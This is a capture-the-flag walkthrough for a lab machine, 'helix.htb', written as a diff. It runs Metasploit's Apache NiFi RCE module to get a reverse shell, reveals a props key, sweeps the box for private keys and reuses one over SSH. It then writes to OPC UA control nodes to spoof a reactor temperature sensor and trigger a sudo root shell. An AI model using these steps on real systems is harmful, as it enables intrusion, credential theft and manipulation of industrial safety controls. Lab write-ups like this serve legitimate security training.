@@ -1,0 +1,49 @@
+1. First started with recon using nmap
+2. found two ports open 80 & 22
+3. visited helix.htb, nothing there
+4. performed virtual host scan and found flow.helix.htb 
+5. it was a nifi flow web interface vulnerable to remote code execution
+6. using Metasploit got a reverse shell 
+steps involved were 
+ msf > use exploit/multi/http/apache_nifi_processor_rce
+msf > set RHOSTS box_id
+msf > set RPORT 80
+msf > set LHOST my id
+msf > set LPORT 4444
+
+Lateral Movement — operator
+Did some recon on the box. Found two H2 databases in /opt/nifi-1.21.0/database_repository/ — nifi-flow-audit.mv.db and nifi-identity-providers.mv.db. Also found a sensitive props key inside nifi.properties:
+nifi.sensitive.props.key=TUHh+YHA30zmdlcA8xq/elNBLPkO03Nl
+
+Then searched for private keys on the box:
+bashfind /opt /etc /var -type f -readable -size +100c -size -10M -exec grep -Irl "BEGIN.*PRIVATE KEY" {} + 2>/dev/null
+Found /opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak — an SSH private key for the operator user. Used it to SSH in:
+bashchmod 600 operator_id_ed25519
+ssh -i operator_id_ed25519 operator@helix.htb
+Grabbed user.txt.
+
+Privilege Escalation — root via OPC UA
+In the operator's home directory there were two files — a PNG and a PDF — both related to Helix Industries reactor operations. The diagram showed an OPC UA server running at opc.tcp://127.0.0.1:4840/helix/ exposing writable control nodes. The PDF documented the maintenance window logic:
+
+Reactor operates in two modes: NORMAL and MAINTENANCE
+A maintenance window opens when temperature reaches ~295°C or pressure ~73 bar, while staying below the safety trip thresholds (~305°C / ~75 bar)
+When the window is open, the file /opt/helix/state/maintenance_window contains a future epoch timestamp
+
+Checked sudo permissions:
+bashsudo -l
+# (root) NOPASSWD: /usr/local/sbin/helix-maint-console
+The helix-maint-console script reads that timestamp file and drops a root shell if the window is active. So the goal was to open the maintenance window through the OPC UA server.
+Port 4840 was only listening on localhost, so set up an SSH tunnel:
+bashssh -i operator_id_ed25519 -L 4840:127.0.0.1:4840 operator@helix.htb
+Browsed the OPC UA node tree:
+bashuabrowse -u opc.tcp://127.0.0.1:4840/helix/ -n "i=85" -l 5
+uabrowse -u opc.tcp://127.0.0.1:4840/helix/ -n "ns=2;i=1" -l 5
+uabrowse -u opc.tcp://127.0.0.1:4840/helix/ -n "ns=2;i=11" -l 3
+Found the writable control nodes — Mode at ns=2;i=12, TestOverride at ns=2;i=13, CalibrationOffset at ns=2;i=6. Current temperature was reading 283.99°C, so needed ~11 units of offset to cross the 295°C threshold.
+Worth noting: we are not directly ramping the temperature. CalibrationOffset is a sensor bias parameter — the PLC sees the shifted reported reading crossing the maintenance threshold and opens the window as a result. The actual reactor temperature is unaffected.
+Read current temp, calculated the offset needed, then executed in one chain:
+bashuawrite -u opc.tcp://127.0.0.1:4840/helix/ -n "ns=2;i=12" --verbose ERROR -t string "MAINTENANCE" && \
+uawrite -u opc.tcp://127.0.0.1:4840/helix/ -n "ns=2;i=13" --verbose ERROR -t bool "true" && \
+uawrite -u opc.tcp://127.0.0.1:4840/helix/ -n "ns=2;i=6" --verbose ERROR -t double "11.0" && \
+sudo /usr/local/sbin/helix-maint-console
+Maintenance window opened, helix-maint-console granted privileged access, and dropped a root shell via systemd-run. Grabbed root.txt.
